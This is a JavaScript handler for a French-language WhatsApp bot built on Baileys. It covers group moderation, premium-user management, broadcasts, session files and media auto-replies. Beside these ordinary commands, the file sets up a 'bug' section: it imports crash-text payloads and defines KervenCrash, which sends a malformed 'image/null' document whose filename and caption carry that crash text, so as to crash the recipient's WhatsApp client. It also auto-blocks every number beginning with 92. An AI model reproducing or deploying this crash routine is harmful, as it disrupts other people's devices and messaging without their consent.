//base par Kervens (Kervens King Bot)
//re-upload? recode? copie du code? donne des crédits stp :)
//YouTube: @Kervens
//Instagram: kervens_king
//Telegram: t.me/soszoe
//GitHub: @Kervens-King
//WhatsApp: +50942588377
//tu veux plus de scripts de bot gratuits? abonne-toi à ma chaîne YouTube: https://youtube.com/@Kervens

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

//base de données des bugs
const { kerventext1 } = require('./69/kerventext1')
const { kerventext2 } = require('./69/kerventext2')
const { kerventext3 } = require('./69/kerventext3')
const { kerventext4 } = require('./69/kerventext4')
const { kerventext5 } = require('./69/kerventext5')
const { kerventext6 } = require('./69/kerventext6')

//base de données
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autoreply
const VoiceNoteKerven = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerKerven = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageKerven = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoKerven = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocKerven = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipKerven = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkKerven = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//temps
const kerventime = moment.tz('America/Port-au-Prince').format('HH:mm:ss')
        const kervendate = moment.tz('America/Port-au-Prince').format('DD/MM/YYYY')
        const time2 = moment().tz('America/Port-au-Prince').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var kerventimewisher = `Bonne Nuit 🌌`
 }
 if(time2 < "19:00:00"){
var kerventimewisher = `Bonsoir 🌃`
 }
 if(time2 < "18:00:00"){
var kerventimewisher = `Bonsoir 🌃`
 }
 if(time2 < "15:00:00"){
var kerventimewisher = `Bon Après-midi 🌅`
 }
 if(time2 < "11:00:00"){
var kerventimewisher = `Bonjour 🌄`
 }
 if(time2 < "05:00:00"){
var kerventimewisher = `Bonjour 🌄`
 } 
module.exports = KervensKingBot = async (KervensKingBot, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "Aucun Nom"
        const botNumber = await KervensKingBot.decodeJid(KervensKingBot.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendedTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await KervensKingBot.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(KervensKingBot, m, premium);

//message de groupe par Kervens
const replyGroup = (teks) => {
KervensKingBot.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./modsMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

//fonctions de bug
const kervenSend = (texto) => {
KervensKingBot.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erreur..")
})
}

const subscribe_kerven = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Kervens est ton père`
}}
}

async function KervenCrash(dgxeon,chat) {
KervensKingBot.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${kerventext1}` ,
caption: `${dgxeon + kerventext1}`,
}, {quoted: subscribe_kerven })
}
//fin des fonctions de bug

async function loading () {
var kervenlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"CHARGEMENT TERMINÉ 🦄..."
]
let { key } = await KervensKingBot.sendMessage(from, {text: 'Chargement...'})

for (let i = 0; i < kervenlod.length; i++) {
await KervensKingBot.sendMessage(from, {text: kervenlod[i], edit: key });
}
}

        if (!KervensKingBot.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        if (autoread) {
            KervensKingBot.readMessages([m.key])
        }
        if (global.autoTyping) {
        KervensKingBot.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        KervensKingBot.sendPresenceUpdate('recording', from)
        }

        
        //statut en ligne du numéro du bot, available=en ligne, unavailable=hors ligne
        KervensKingBot.sendPresenceUpdate('unavailable', from)
        
        if (global.autorecordtype) {
        let kervenrecordin = ['recording','composing']
        let kervenrecordinfinal = kervenrecordin[Math.floor(Math.random() * kervenrecordin.length)]
        KervensKingBot.sendPresenceUpdate(kervenrecordinfinal, from)
        }
        
        if (autobio) {
            KervensKingBot.updateProfileStatus(`Bot en ligne 24/7 par ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return KervensKingBot.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await KervensKingBot.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await KervensKingBot.getName(i)}\nFN:${await KervensKingBot.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Cliquez pour discuter\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Région\nEND:VCARD`
	    })
	}
	
	//compteur de chat (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Chat de Groupe:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Dans'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Chat Privé:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaKerven of VoiceNoteKerven) {
if (budy === BhosdikaKerven) {
let audiobuffy = fs.readFileSync(`./modsMedia/audio/${BhosdikaKerven}.mp3`)
KervensKingBot.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaKerven of StickerKerven){
if (budy === BhosdikaKerven){
let stickerbuffy = fs.readFileSync(`./modsMedia/sticker/${BhosdikaKerven}.webp`)
KervensKingBot.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaKerven of ImageKerven){
if (budy === BhosdikaKerven){
let imagebuffy = fs.readFileSync(`./modsMedia/image/${BhosdikaKerven}.jpg`)
KervensKingBot.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaKerven of VideoKerven){
if (budy === BhosdikaKerven){
let videobuffy = fs.readFileSync(`./modsMedia/video/${BhosdikaKerven}.mp4`)
KervensKingBot.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
KervensKingBot.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaKerven of ApkKerven) {
if (budy === BhosdikaKerven) {
let buffer = fs.readFileSync(`./modsMedia/apk/${BhosdikaKerven}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
KervensKingBot.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaKerven of ZipKerven) {
if (budy === BhosdikaKerven) {
let buffer = fs.readFileSync(`./modsMedia/zip/${BhosdikaKerven}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
KervensKingBot.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaKerven of DocKerven) {
if (budy === BhosdikaKerven) {
let buffer = fs.readFileSync(`./modsMedia/doc/${BhosdikaKerven}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replyGroup(`Ne le taguez pas, il est afk\n\n*Raison :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                KervensKingBot.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} est de retour d'afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 2)
                    return replyGroup(`Utilisation :\n*#addprem* @tag temps\n*#addprem* numéro temps\n\nExemple : #addprem @tag 30j`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyGroup("Premium Ajouté avec Succès")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyGroup("Succès")
                }
                break
            case 'delprem':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 1) return replyGroup(`Utilisation :\n*#delprem* @tag\n*#delprem* numéro`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replyGroup("Suppression réussie")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replyGroup("Succès")
                }
                break
            case 'listprem': {
                if (!isCreator) return replyGroup(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LISTE PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Numéro : ${i.id}\n`
                    txt += `Expiration : ${i.expired} Secondes\n`         
                }                
                KervensKingBot.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replyGroup(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Impossible de scanner le répertoire: ' + err);
                        return replyGroup('Impossible de scanner le répertoire: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Détecté ${filteredArray.length} fichiers indésirables\n\n`
                    if (filteredArray.length == 0) return replyGroup(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replyGroup(teks)
                    await sleep(2000)
                    replyGroup("Suppression des fichiers indésirables...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replyGroup("Tous les fichiers indésirables du dossier session ont été supprimés avec succès")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replyGroup(mess.owner)
                    if (!text) return replyGroup('Entrez le lien du groupe!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyGroup('Lien invalide!')
                    replyGroup(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await KervensKingBot.groupAcceptInvite(result).then((res) => replyGroup(json(res))).catch((err) => replyGroup(json(err)))
                } catch {
                    replyGroup('Échec de la jointure au groupe')
                }
                break      
            case 'getsession':
                if (!isCreator) return replyGroup(mess.owner)
                replyGroup('Attendez un moment, récupération de votre fichier de session')
                let sesi = await fs.readFileSync('./session/creds.json')
                KervensKingBot.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replyGroup(mess.owner)
                replyGroup(`Au revoir🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replyGroup(mess.owner)
                replyGroup('En cours....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 1) return replyGroup(`Exemple ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyGroup(`Autoread changé avec succès en ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyGroup(`Autoread changé avec succès en ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 1) return replyGroup(`Exemple ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replyGroup(`Auto-typing changé avec succès en ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyGroup(`Auto-typing changé avec succès en ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 1) return replyGroup(`Exemple ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replyGroup(`Auto-recording changé avec succès en ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyGroup(`Auto-recording changé avec succès en ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 1) return replyGroup(`Exemple ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replyGroup(`Auto recording and typing changé avec succès en ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replyGroup(`Auto recording and typing changé avec succès en ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replyGroup(mess.owner)
               if (args.length < 1) return replyGroup('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replyGroup(`${command} activé`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replyGroup(`${command} désactivé`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 1) return replyGroup(`Exemple ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyGroup(`AutoBio changé avec succès en ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyGroup(`AutoBio changé avec succès en ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replyGroup(mess.owner)
                if (args.length < 1) return replyGroup(`Exemple ${prefix + command} public/self`)
                if (q == 'public') {
                    KervensKingBot.public = true
                    replyGroup(mess.done)
                } else if (q == 'self') {
                    KervensKingBot.public = false
                    replyGroup(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replyGroup(mess.owner)
                if (!text) return replyGroup(`Exemple : ${prefix + command} packname|auteur`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyGroup(`Exif changé avec succès en\n\n• Packname : ${global.packname}\n• Auteur : ${global.author}`)
                break
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replyGroup(mess.owner)
                if (!quoted) return replyGroup(`Envoyez/Répondez à une image avec la légende ${prefix + command}`)
                if (!/image/.test(mime)) return replyGroup(`Envoyez/Répondez à une image avec la légende ${prefix + command}`)
                if (/webp/.test(mime)) return replyGroup(`Envoyez/Répondez à une image avec la légende ${prefix + command}`)
                var medis = await KervensKingBot.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await KervensKingBot.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyGroup(mess.done)
                } else {
                    var memeg = await KervensKingBot.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyGroup(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replyGroup(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await KervensKingBot.updateBlockStatus(blockw, 'block').then((res) => replyGroup(json(res))).catch((err) => replyGroup(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replyGroup(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await KervensKingBot.updateBlockStatus(blockww, 'unblock').then((res) => replyGroup(json(res))).catch((err) => replyGroup(json(err)))
                break
            case 'leave':
                if (!isCreator) return replyGroup(mess.owner)
                if (!m.isGroup) return replyGroup(mess.group)
                replyGroup('Au revoir tout le monde 🥺')
                await KervensKingBot.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replyGroup(mess.owner)
                if (m.isGroup) return replyGroup(mess.private)
                replyGroup(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await KervensKingBot.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replyGroup(mess.owner)
                if (!text) return replyGroup(`Quel texte?\n\nExemple : ${prefix + command} C'est demain les vacances`)
                let getGroups = await KervensKingBot.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyGroup(`Envoi de broadcast à ${anu.length} groupes, temps estimé ${anu.length * 1.5} secondes`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    KervensKingBot.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast par le Propriétaire',
                                body: `Envoyé à ${i.length} groupes`,
                                thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyGroup(`Broadcast envoyé avec succès à ${anu.length} groupes`)
            }
            break
            case 'getcase':
                if (!isCreator) return replyGroup(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("KervenBug4.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replyGroup(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replyGroup(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyGroup('Le message n\'a pas été envoyé par un bot!')
                KervensKingBot.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (args[1] == 'secondes') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minutes') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'heures') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'jours') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyGroup('*Choisissez:*\nsecondes\nminutes\nheures\njours\n\n*Exemple*\n10 secondes')
                }
                replyGroup(`Fermeture dans ${q} à partir de maintenant`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Fermé* le groupe est fermé par l'admin\nmaintenant seul l'admin peut envoyer des messages`
                    KervensKingBot.groupSettingUpdate(m.chat, 'announcement')
                    replyGroup(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (args[1] == 'secondes') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minutes') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'heures') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'jours') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyGroup('*Choisissez:*\nsecondes\nminutes\nheures\njours\n\n*Exemple*\n10 secondes')
                }
                replyGroup(`Ouverture dans ${q} à partir de maintenant`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Ouvert* Le groupe est ouvert par l'admin\nMaintenant les membres peuvent envoyer des messages`
                    KervensKingBot.groupSettingUpdate(m.chat, 'not_announcement')
                    replyGroup(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await KervensKingBot.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replyGroup(json(res))).catch((err) => replyGroup(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await KervensKingBot.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replyGroup(json(res))).catch((err) => replyGroup(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await KervensKingBot.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replyGroup(json(res))).catch((err) => replyGroup(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await KervensKingBot.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replyGroup(json(res))).catch((err) => replyGroup(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (!text) return 'Texte ?'
                await KervensKingBot.groupUpdateSubject(m.chat, text).then((res) => replyGroup(mess.success)).catch((err) => replyGroup(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (!text) return 'Texte ?'
                await KervensKingBot.groupUpdateDescription(m.chat, text).then((res) => replyGroup(mess.success)).catch((err) => replyGroup(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (!quoted) return replyGroup(`Envoyez/Répondez à une image avec la légende ${prefix + command}`)
                if (!/image/.test(mime)) return replyGroup(`Envoyez/Répondez à une image avec la légende ${prefix + command}`)
